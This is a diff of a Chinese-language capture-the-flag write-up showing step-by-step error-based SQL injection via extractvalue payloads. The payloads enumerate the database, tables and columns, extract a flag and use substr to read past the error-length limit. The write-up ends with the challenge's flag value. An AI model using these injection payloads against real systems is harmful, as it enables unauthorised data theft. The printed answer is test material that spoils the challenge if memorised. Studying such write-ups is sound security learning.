@@ -118,10 +118,15 @@ print(res.text)
 ## 注入步骤
 1. 查数据库，payload为 `admin') and extractvalue(1, concat(0x7e, (select database()),0x7e)) #` 得到结果为
 ![82f32883e9f806f1f74bc0a1b18b46b2.png](../_resources/82f32883e9f806f1f74bc0a1b18b46b2.png)
+
 2. 查表，payload为`admin') and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'),0x7e)) #` 结果为：
 ![0395781c0b398cbeedfac91d461d9289.png](../_resources/0395781c0b398cbeedfac91d461d9289.png)
+
 3. 因为上一步得到了flag表，因此查flag表中的字段，payload为`admin') and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'),0x7e)) #` 结果为：![153e9ebb795932f2da08db0b1ab32840.png](../_resources/153e9ebb795932f2da08db0b1ab32840.png)
+   
 4. 查内容，由于只有flag一个字段，payload为`admin') and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #` ，结果为![a15fc33cb5e87f15dbc6abb2e9f4c593.png](../_resources/a15fc33cb5e87f15dbc6abb2e9f4c593.png)
+   
 5. 此时出现了另一个问题，报错的回显最大位数为31位，此时我们只获得前了31位（数一下就行），需要用substr函数进行分割读取后面的位数：`admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),32),0x7e)) #` （意思是从第32位开始截取）结果为：![868925aa8842fa2aa4676c1ed82b2219.png](../_resources/868925aa8842fa2aa4676c1ed82b2219.png)
+   
 6. 将两次的结果合并即可
 `cyberpeace{812b25eedd2520a4beeef2bca1ce7832}`
